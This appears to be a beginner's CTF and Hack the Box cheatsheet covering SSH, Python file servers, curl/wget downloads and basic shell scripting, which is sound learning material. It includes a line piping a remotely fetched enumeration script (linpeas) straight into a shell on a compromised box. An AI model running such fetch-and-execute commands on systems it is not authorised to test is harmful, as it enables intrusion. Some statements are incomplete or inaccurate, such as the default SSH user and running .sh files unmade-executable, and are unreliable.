# Fundamental Skills
Here are some of the things I consider fundamental to CTFs, Hack the Box-esque challenges, and web hacking.

Skills include knowing how to transfer files between computers, crack passwords, remotely access a machine, run reconnaisance scans, analyse HTTP requests, and script with bash or python.

Each skill links to a more detailed entry in the cheatsheets, and some even have links to practical example where the skills have been used on a box or challenge.

Start here if you are a complete beginner!

## Remote Access to a Computer

### SSH

SSH means 'secure shell', and is one of the most fundamental ways of remotely accessing another computer.

SSH access is controlled by keys, using public-key cryptography. 'Hosts' make themselves

The SSH protocol also powers many other tools and services, such as [[Linux Networking#Secure Copy]] and port forwarding.

**Basic Syntax**

```bash
ssh [user@]IP_ADDRESS
```

The `user@` portion is optional, and specifies a specific user you would like to connect as. The default is usually `root`, but this can vary depending on a host's ssh config.

## Filesharing Between Computers

There are many situations when you may want to transfer a file to a remote host. The most common example I can think of is when uploading an enumeration script to a machine you have gained a foothold on.

### Python Webserver

This is one of the easiest methods of file transfer. It involves starting a basic HTTP server on your machine and using this to serve files to a remote computer.

```bash
$ python3 -m http.server
```

By default, this listens on port 8000. You can change the port by specifying an unused port number after the command:

```bash
$ python3 -m http.server [PORT]
```

If you want to listen on a priveleged port (<1000) you must run with root priveleges. Running on port 80 or 443 is a common use case, as they are the default ports for HTTP/S, and sometimes target machines will only communicate on one of these default ports.

```bash
$ sudo python3 -m http.server 80
```

**Communicating with the Server**

You can then make a request to this server from a remote box. For example, using `curl`:

```bash
$ curl [IP]:[PORT]/example.txt
```

Or `wget`:

```bash
$ wget [IP]:[PORT]/example.txt
```

This will request the file `example.txt` from your host machine, and download it to the box. The choice of command depends on what is installed on the box.

You can also pipe the results of a `curl` directly to a shell. This is useful for running a script such as linpeas.

```bash
$ curl [IP]:[PORT]/linpeas.sh | sh
```

Make sure to kill your server when you are done. It is also good practice to start your server in a directory without any sensitive files in it - just the scripts you want to upload.

See [[Aliases#Useful Aliases|Useful Aliases]] for the `enumserve` alias, which starts a Python Server in a preset directory that is full of juicy scripts.

## Scripting & Programming

### sh/bash

Any command you can run in a unix command line, you can run in a bash script.

To create a bash script, add the `#!/bin/bash` shebang to a file, then write whatever commands you want to the file using a text editor. For example:

```bash
echo '#!/bin/bash' > bash_script
```

contents of `bash_script`:

To execute it, make it executable:

```bash
chmod +x bash_script
```

Then run it:

```bash
bash bash_script
```

**sh**

`sh` scripting is similar, but doesn't require a shebang. Just write commands to any file with the `.sh` extension, and execute the file:

```bash
echo 'ls -la' > list-files.sh
./list-files.sh
```